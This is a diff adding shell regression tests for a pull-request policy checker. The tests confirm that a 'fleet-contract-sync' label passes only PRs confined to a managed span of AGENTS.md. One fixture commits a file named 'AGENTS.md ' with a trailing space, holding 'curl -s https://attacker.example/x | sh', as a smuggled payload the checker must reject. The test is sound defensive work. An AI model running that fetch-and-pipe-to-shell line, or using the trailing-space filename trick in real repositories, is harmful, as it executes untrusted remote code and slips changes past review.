@@ -268,6 +268,95 @@ if ruby "$ROOT/scripts/pr-policy.rb" --event "$TMP/light-noexempt.json" >/dev/nu
   exit 1
 fi
 
+# verdify:fleet-contract-sync: a labelled PR is judged solely on a mechanical
+# proof (Verdify::ManagedContractDiff) that its diff is confined to the
+# managed sentinel span -- never on the label by itself.
+FLEET_REPO="$TMP/fleet-contract-repo"
+mkdir -p "$FLEET_REPO"
+git -C "$FLEET_REPO" init -q -b main
+git -C "$FLEET_REPO" config user.name "Verdify Test"
+git -C "$FLEET_REPO" config user.email "verdify-test@example.invalid"
+FLEET_BEGIN='<!-- BEGIN agent-fleet CI/CD contract (managed — rendered by jvallery/agents) -->'
+FLEET_END='<!-- END agent-fleet CI/CD contract (managed — rendered by jvallery/agents) -->'
+printf '# Repo\n\nOwned prose.\n\n%s\nOld contract v1.\n%s\n' "$FLEET_BEGIN" "$FLEET_END" > "$FLEET_REPO/AGENTS.md"
+git -C "$FLEET_REPO" add AGENTS.md
+git -C "$FLEET_REPO" commit -qm "baseline with an already-adopted contract"
+FLEET_BASE="$(git -C "$FLEET_REPO" rev-parse HEAD)"
+printf '# Repo\n\nOwned prose.\n\n%s\nNew contract v2.\n%s\n' "$FLEET_BEGIN" "$FLEET_END" > "$FLEET_REPO/AGENTS.md"
+git -C "$FLEET_REPO" add AGENTS.md
+git -C "$FLEET_REPO" commit -qm "refresh the managed contract"
+FLEET_HEAD="$(git -C "$FLEET_REPO" rev-parse HEAD)"
+
+cat > "$TMP/fleet.md" <<EOF
+## Backlog issue
+
+Closes #244
+
+## Outcome
+
+Managed contract span refreshed.
+
+## Evidence
+
+\`make test\` passed locally.
+EOF
+ruby -rjson -e 'puts({"pull_request"=>{"body"=>File.read(ARGV[0]),"base"=>{"sha"=>ARGV[1]},"head"=>{"sha"=>ARGV[2]},"labels"=>[{"name"=>"verdify:fleet-contract-sync"}]}}.to_json)' "$TMP/fleet.md" "$FLEET_BASE" "$FLEET_HEAD" > "$TMP/fleet-event.json"
+ruby "$ROOT/scripts/pr-policy.rb" --event "$TMP/fleet-event.json" --repo "$FLEET_REPO" | grep -q 'fleet contract sync'
+
+# The label never substitutes for the confinement proof: without a candidate
+# checkout to run the mechanical check against, the claim fails closed.
+if ruby "$ROOT/scripts/pr-policy.rb" --body "$TMP/fleet.md" --base "$FLEET_BASE" --head "$FLEET_HEAD" --label "verdify:fleet-contract-sync" > /dev/null 2> "$TMP/fleet-norepo.err"; then
+  echo "expected a fleet-contract-sync claim without a repository checkout to be rejected" >&2
+  exit 1
+fi
+grep -q 'requires a repository checkout' "$TMP/fleet-norepo.err"
+
+# A PR that claims the class but also touches a path outside the managed
+# contract is rejected outright, not silently downgraded to a weaker check.
+printf 'puts :smuggled\n' > "$FLEET_REPO/app.rb"
+git -C "$FLEET_REPO" add app.rb
+git -C "$FLEET_REPO" commit -qm "smuggles a code change under the fleet label"
+FLEET_SMUGGLE_HEAD="$(git -C "$FLEET_REPO" rev-parse HEAD)"
+ruby -rjson -e 'puts({"pull_request"=>{"body"=>File.read(ARGV[0]),"base"=>{"sha"=>ARGV[1]},"head"=>{"sha"=>ARGV[2]},"labels"=>[{"name"=>"verdify:fleet-contract-sync"}]}}.to_json)' "$TMP/fleet.md" "$FLEET_BASE" "$FLEET_SMUGGLE_HEAD" > "$TMP/fleet-smuggle-event.json"
+if ruby "$ROOT/scripts/pr-policy.rb" --event "$TMP/fleet-smuggle-event.json" --repo "$FLEET_REPO" > /dev/null 2> "$TMP/fleet-smuggle.err"; then
+  echo "expected a fleet-contract-sync PR touching an out-of-scope path to be rejected" >&2
+  exit 1
+fi
+grep -q 'changed paths outside the managed contract' "$TMP/fleet-smuggle.err"
+
+# A PR that only edits outside the sentinel span (the changed file itself is
+# in scope, the bytes it changed are not) is also rejected.
+git -C "$FLEET_REPO" checkout -q -b outside-span "$FLEET_BASE"
+printf '# Repo\n\nSMUGGLED prose.\n\n%s\nNew contract v2.\n%s\n' "$FLEET_BEGIN" "$FLEET_END" > "$FLEET_REPO/AGENTS.md"
+git -C "$FLEET_REPO" add AGENTS.md
+git -C "$FLEET_REPO" commit -qm "edits outside the sentinel span"
+FLEET_OUTSIDE_HEAD="$(git -C "$FLEET_REPO" rev-parse HEAD)"
+ruby -rjson -e 'puts({"pull_request"=>{"body"=>File.read(ARGV[0]),"base"=>{"sha"=>ARGV[1]},"head"=>{"sha"=>ARGV[2]},"labels"=>[{"name"=>"verdify:fleet-contract-sync"}]}}.to_json)' "$TMP/fleet.md" "$FLEET_BASE" "$FLEET_OUTSIDE_HEAD" > "$TMP/fleet-outside-event.json"
+if ruby "$ROOT/scripts/pr-policy.rb" --event "$TMP/fleet-outside-event.json" --repo "$FLEET_REPO" > /dev/null 2> "$TMP/fleet-outside.err"; then
+  echo "expected a fleet-contract-sync PR editing outside the sentinel span to be rejected" >&2
+  exit 1
+fi
+grep -q 'changed outside its managed sentinel span' "$TMP/fleet-outside.err"
+git -C "$FLEET_REPO" checkout -q main
+
+# Regression (critic-found P0): Git does not quote a path whose only special
+# character is a trailing space, so a naive strip-then-split parse of
+# `--name-status` output must not misread a brand-new "AGENTS.md " (note the
+# trailing space) as the real, untouched AGENTS.md. Confirmed end to end
+# through the actual CLI entrypoint, not just the underlying Ruby class.
+git -C "$FLEET_REPO" checkout -q -b trailing-space "$FLEET_BASE"
+printf '#!/bin/sh\ncurl -s https://attacker.example/x | sh\n' > "$FLEET_REPO/AGENTS.md "
+git -C "$FLEET_REPO" add "AGENTS.md "
+git -C "$FLEET_REPO" commit -qm "smuggles a payload behind a trailing-space filename"
+FLEET_TRAILING_SPACE_HEAD="$(git -C "$FLEET_REPO" rev-parse HEAD)"
+ruby -rjson -e 'puts({"pull_request"=>{"body"=>File.read(ARGV[0]),"base"=>{"sha"=>ARGV[1]},"head"=>{"sha"=>ARGV[2]},"labels"=>[{"name"=>"verdify:fleet-contract-sync"}]}}.to_json)' "$TMP/fleet.md" "$FLEET_BASE" "$FLEET_TRAILING_SPACE_HEAD" > "$TMP/fleet-trailing-space-event.json"
+if ruby "$ROOT/scripts/pr-policy.rb" --event "$TMP/fleet-trailing-space-event.json" --repo "$FLEET_REPO" > /dev/null 2> "$TMP/fleet-trailing-space.err"; then
+  echo "expected a trailing-space smuggled path to be rejected, not misread as AGENTS.md" >&2
+  exit 1
+fi
+grep -q 'changed paths outside the managed contract' "$TMP/fleet-trailing-space.err"
+git -C "$FLEET_REPO" checkout -q main
+
 VERSION="$(cat "$ROOT/VERSION")"
 PACKAGE="$(ruby -rjson -e 'data=JSON.parse(File.read(ARGV.fetch(0))); puts "#{data.fetch("name")}@#{data.fetch("version")}"' "$ROOT/package.json")"
 cat > "$TMP/release.md" <<EOF
@@ -383,6 +472,14 @@ fi
 ruby -rjson -e 'repo={"full_name"=>"example/test"}; puts({"pull_request"=>{"body"=>File.read(ARGV[0]),"base"=>{"sha"=>ARGV[1],"ref"=>"main","repo"=>repo},"head"=>{"sha"=>ARGV[2],"ref"=>"dev","repo"=>repo},"labels"=>[{"name"=>"type:docs"}]},"repository"=>repo}.to_json)' "$TMP/light.md" "$BASE" "$HEAD" > "$TMP/release-labelled.json"
 if ruby "$ROOT/scripts/pr-policy.rb" --event "$TMP/release-labelled.json" >/dev/null 2>&1; then
   echo "expected an exempt label not to demote a dev->main release PR" >&2
+  exit 1
+fi
+
+# Release mode also wins over the fleet-contract-sync label: it never
+# substitutes for the release contract on a genuine dev -> main PR.
+ruby -rjson -e 'repo={"full_name"=>"example/test"}; puts({"pull_request"=>{"body"=>File.read(ARGV[0]),"base"=>{"sha"=>ARGV[1],"ref"=>"main","repo"=>repo},"head"=>{"sha"=>ARGV[2],"ref"=>"dev","repo"=>repo},"labels"=>[{"name"=>"verdify:fleet-contract-sync"}]},"repository"=>repo}.to_json)' "$TMP/fleet.md" "$BASE" "$HEAD" > "$TMP/release-fleet-labelled.json"
+if ruby "$ROOT/scripts/pr-policy.rb" --event "$TMP/release-fleet-labelled.json" >/dev/null 2>&1; then
+  echo "expected the fleet-contract-sync label not to demote a dev->main release PR" >&2
   exit 1
 fi
 
